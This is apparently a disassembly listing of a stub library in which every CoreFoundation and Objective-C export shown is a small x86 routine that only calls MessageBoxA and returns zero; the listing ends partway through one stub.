OBJC_IVAR_$___NSCFDictionary$_cfinfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFDictionary$_keys
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFDictionary$_values
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFSet$_bits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFSet$_callbacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFSet$_cfinfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSCFSet$_values
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDate$_time
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryI__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryM$_keys
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryM$_mutations
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryM$_objs
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryM$_size
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSDictionaryM__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSOrderedSetI__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSOrderedSetM$_array
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSOrderedSetM$_set
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSOrderedSetM$_used
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_currE
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_dump
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_edges
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_l_end
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_numE
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_numV
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSKGraph$_vertices
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSetI__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSetM$_mutations
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSetM$_objs
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSetM$_size
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSSetM__GRBF_1
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSTimeZone$_data
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSTimeZone$_lock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSTimeZone$_name
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_IVAR_$___NSTimeZone$_ucal
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesCompatibilitySource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesManagedSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesPropertyListSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesPropertyListSourceSynchronizer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesSearchListSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_CFXPreferencesWindowsSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSBlockInvocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSDateComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSException
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSInputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSInvocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMessageBuilder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMethodSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMutableArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMutableData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMutableDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMutableOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSMutableSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSNull
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSOutputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSSharedKeyDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSSharedKeySet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NSUserDefaults
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$_NotificationClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$__NSZombie_
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___CFNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSArrayI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSArrayM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSArrayReverseEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSArrayReversed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSAtom
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSAutoBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSBlockVariable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFAttributedString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFBoolean
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFCharacterSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFConstantString0
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFInputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFOutputStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSCFType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSDictionaryI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSDictionaryM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSDictionaryObjectEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSFastEnumerationEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSFinalizingBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSGenericDeallocHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSGlobalBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSLocalTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSMallocBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetArrayProxy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetReverseEnumerator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetReversed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSOrderedSetSetProxy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderOrderedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSPlaceholderTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSSKGraph
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSSetI
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSSetM
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSStackBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OBJC_METACLASS_$___NSTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicAdd32
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicAdd32Barrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicCompareAndSwap32Barrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicCompareAndSwapLong
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicCompareAndSwapPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicCompareAndSwapPtrBarrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicDecrement32
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicDecrement32Barrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicIncrement32
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicIncrement32Barrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicTestAndClear
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicTestAndClearBarrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicTestAndSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSAtomicTestAndSetBarrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSMemoryBarrier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSReadSwapInt32
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
OSWriteSwapInt32
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAllocatorAllocateGC
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAllocatorDeallocateGC
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAllocatorReallocateGC
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppVersionCheck
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppVersionCheckLessThan
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppWindowsVersionCheck
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppWindowsVersionCheckLessThan
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppendPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAppendPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFArrayCheckAndGetValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFArrayFastEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFArrayIsMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFArrayReplaceValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFArraySetCapacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAttributedStringCheckAndReplace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAttributedStringCheckAndReplaceAttributed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAttributedStringCheckAndSetAttribute
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAttributedStringCheckAndSetAttributes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAttributedStringGetLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAutoreleasePoolAddObject
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAutoreleasePoolPop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAutoreleasePoolPrintPools
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFAutoreleasePoolPush
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBagFastEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBagGetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBagIsMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBagSetCapacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBagSetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyAllBundles
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyBuiltInPlugInsURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyBundleRegionsArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyBundleURLForExecutableURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyExecutableURLInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyFileTypeForFileData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyFileTypeForFileURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyFindResources
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyFrameworkURLForExecutablePath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyInfoPlistURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyLanguageSearchListInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyMainBundleExecutableURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyOtherExecutableURLInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyPrivateFrameworksURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyResourceForkURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyResourceURLForLanguage
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopyResourceURLsOfTypeForLanguage
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopySharedFrameworksURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCopySharedSupportURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateFilteredInfoPlist
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateFilteredLocalizedInfoPlist
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateIfLooksLikeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateIfMightBeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateWithExecutableURLIfLooksLikeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleCreateWithExecutableURLIfMightBeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
